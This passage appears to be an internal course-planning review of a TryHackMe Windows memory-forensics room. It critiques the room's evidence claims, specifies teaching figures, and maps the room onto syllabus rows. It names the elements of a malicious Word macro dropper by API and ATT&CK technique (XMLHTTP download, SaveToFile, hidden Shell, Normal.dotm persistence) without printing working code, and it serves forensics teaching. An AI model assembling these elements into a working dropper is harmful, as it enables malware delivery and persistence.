| *"`hivelist` shows `operator`'s hive loaded. Was the user at the keyboard?"* | **No** — a loaded hive proves a profile was loaded, which happens at logon, `runas`, fast user switching or a service. |
| *"`cmdline` shows this path. Is that where the binary was?"* | **Not proven** — the PEB is user-writable; corroborate with a kernel-side source. |

**Each one is answerable from evidence the room already put on screen.** Our versions ask exactly
these three.

**🔴 And the room's own Task 7 timeline asserts what it did not establish** — *"The document
triggered a linked template (.dotm) that contained embedded macros."* The evidence shows a macro
**in the global template**. Whether the `.docm` put it there is untested. **The room commits the
exact error its own artifacts disprove**, which makes Task 7 a ready-made D20 criterion-4 marking
exercise: hand students the timeline and ask which of the seven lines the evidence supports.

## 7. Figures we would need to draw

Figures present in the room: **none.** Task 2 repeats room 12's network map and company logo; every
other visual is terminal output or a C struct. There is not one conceptual diagram in the room.

| # | what is needed | our SVG spec (one line) | priority |
|---|---|---|---|
| 1 | **the two persistence mechanisms** | one host, two arrows out of the compromise: **(a) `…\Startup\windows-update.exe` → fires at logon → T1547.001** and **(b) `Normal.dotm` macro → fires on every Word document, including `.docx` → T1137.001**; caption *"remove one and the other survives"* | **highest** — this is the room's missed finding made visible |
| 2 | **user-space claim vs kernel-space record** | the trust line again (reuse room 12 figure 1): **PEB / `cmdline`** below it labelled *"the process's claim"*, **`_EPROCESS.ObjectTable` / `handles`** above it labelled *"the kernel's record"*, one `.docm` reached from both; caption *"agreement is the finding"* | **high** |
| 3 | **what UserAssist can and cannot see** | one process tree from room 12, with **GUI-launched nodes** (`cmd.exe` via Command Prompt.lnk, `WINWORD.EXE`, `FTK Imager.exe`) drawn solid and **process-spawned nodes** (`pdfupdater` → `windows-update` → `updater`) drawn ghosted, over a caption *"UserAssist sees the solid ones only — absence is not evidence of absence"* | **high** — best "what it does NOT prove" figure available |
| 4 | **four format layers to source code** | a nesting diagram: memory image ⊃ `_FILE_OBJECT` ⊃ OOXML ZIP ⊃ `word/vbaProject.bin` ⊃ VBA source, each ring labelled with the tool that opens it (`dumpfiles` → `file` → `olevba`), with the **`unzip` ring struck through** and marked *"skip — olevba reads the container"* | **high** |
| 5 | **the responder's footprint** | the 07:12–07:16 timeline as one strip with **attacker events above the line** and **responder events below it** (UserAssist 07:15:27 → FTK Imager 07:15:28 → dump `071528`), captioned *"acquisition is not passive"* | **high** — nothing else in the path teaches this |
| 6 | **the redundant trigger** | two boxes `AutoOpen()` and `Document_Open()` both arrowed into one `DownloadAndExecute()`, annotated with when each fires; caption *"two doors, one room"* | medium |
| 7 | **the macro as a chain of ATT&CK IDs** | the VBA source down the left, each line tagged on the right — `CreateObject("MSXML2.XMLHTTP")` → **T1105** · `SaveToFile` → the drop path · `Shell …, vbHide` → **T1564.003** · `AutoOpen` in `Normal.dotm` → **T1137.001** | medium — a good "map real code, not a scenario" exercise |

Figures 1, 3 and 5 are the three that teach something no room in this path teaches. Never their
images (**D22**).

## 8. Fit against our material

### ✅ Part 1's mapping is correct

Mapped to `S6` / `S6-10`. Correct. Second of the three-room set; room 14 (Network) closes it.

### Rows this strengthens

- **`S6-10`** — the plugin sequence, the user-space/kernel-space corroboration rule, and the
  UserAssist limits. **Over-supplied now by rooms 11–13 together.**
- **`S6-09` capstone** — 🟢 **the macro-recovery chain (§5.2) should be the capstone's final act.**
  It is the only exercise in the path where the student ends holding the attacker's own code.
- **`S5`** — 🔴 **UserAssist is an S5 artifact and this room corrects our brief on it**: the `+5`
  offset is XP-only, it is GUI-only (so absence proves nothing), it records no arguments, and the
  count is an interaction tally rather than an execution count. **Check `windows-user-activity.md`
  against these four before S5 is built.**
- **`S5` again** — 🟢 the lazy-flush finding in §2.2 (memory copy newer than the on-disk hive)
  **connects straight to the room-4 transaction-log matrix.** Same mechanism, seen from the other
  end. One slide can now carry both: *"the current registry lives in RAM and the logs; the hive
  file is the stale copy."*
- **`S1`** — three contributions: the fifth safety defect completing the handling exercise; the
  fabricated-structure sourcing exercise (§5); and the **responder-footprint** habit (§2.8, §4).
- **`S2` acquisition** — the responder-footprint reproduction on `EVI-SRC01` (§4) is free evidence
  and a real professional habit.

### Four things `S6-10` and the capstone must do differently

1. **Name `Normal.dotm` as persistence (T1137.001)** and contrast it with the Startup folder.
   Deleting the dropped binary does not remove the macro.
2. **State that `cmdline` reads the PEB and the PEB is user-writable.** Neither room says it.
3. **Teach `olevba <container>`, never `unzip` + `olevba word/vbaProject.bin`** — safer, shorter,
   and it keeps remote-template links in scope.
4. **Establish the responder's own footprint first and exclude it**, before any analysis.

### 🔴 Repo-wide action item

Currency finding **16**: **ATT&CK v19 renamed TA0005 from "Defense Evasion" to "Stealth"** (the
remainder split off as TA0112 Defense Impairment). **Grep the whole repo for `Defense Evasion` and
`TA0005` before S1 or any rubric ships.** This is not confined to this room.

### Minutes

Everything this room adds is either **correction** (fits in existing `S6-10` and `S5` slides),
**exercise material** (fits in `S1` and `S6-09`, both of which already have rows), or **figures**
(slides, not rows).

**No new rows. S6 stays at 220.**

**Running totals: S2 220 · S4 220 · S6 220 · S5 65 minutes overdrawn** (rooms 1–5, unchanged).

### Out of scope

Malware analysis of the dropped binaries — correctly deferred. Network artifacts — room 14.
**No scope conflict.**

### Still unresolved

**Browser forensics** — thirteenth room, still no `DECISIONS.md` row. This room again shows Edge
sessions in the `windows.sessions` output and never examines them. **Decide it.**

## 9. Links

- Room: <https://tryhackme.com/room/windowsmemoryanduseractivity>
- Set: room 12 `windowsmemoryandprocs` (extracted) → **this room** → room 14
  `windowsmemoryandnetwork`. Same image, same host, one continuous timeline.
- Room's stated prerequisites: Volatility · Windows Fundamentals · Memory Analysis Introduction ·
  **Windows Memory & Processes**.
- Volatility 3 docs: <https://volatility3.readthedocs.io/en/stable/> (**`/stable/`, not `/latest/`**)
- oletools: <https://github.com/decalage2/oletools> · olevba doc
  <https://github.com/decalage2/oletools/wiki/olevba>
- **The `.CAB` SESSION struct the room mistook for a logon structure**:
  <https://learn.microsoft.com/en-us/windows/win32/devnotes/session>
- UserAssist reference: <https://github.com/libyal/winreg-kb/blob/main/docs/sources/explorer-keys/User-assist.md>
  · registry lazy-flush behaviour: Maxim Suhanov, *Flush strategies in the Windows registry*
- ATT&CK: **T1137.001** <https://attack.mitre.org/techniques/T1137/001/> ·
  T1137 family <https://attack.mitre.org/techniques/T1137/> ·
  T1105 <https://attack.mitre.org/techniques/T1105/> ·
  **T1564.003** <https://attack.mitre.org/techniques/T1564/003/> (tactic now **Stealth**) ·
  version history <https://attack.mitre.org/resources/versions/>
- Word auto-macro scope (the proof that `Normal.dotm` fires for every document):
  <https://learn.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros>
- Full memory-tool currency: `Resources/THM/_TOOL_CURRENCY_2026-08-28.md` **block D**
- Room 12's note (shared scenario, network map, and the four documentation inconsistencies):
  `Resources/THM/windows-memory-and-processes.md`
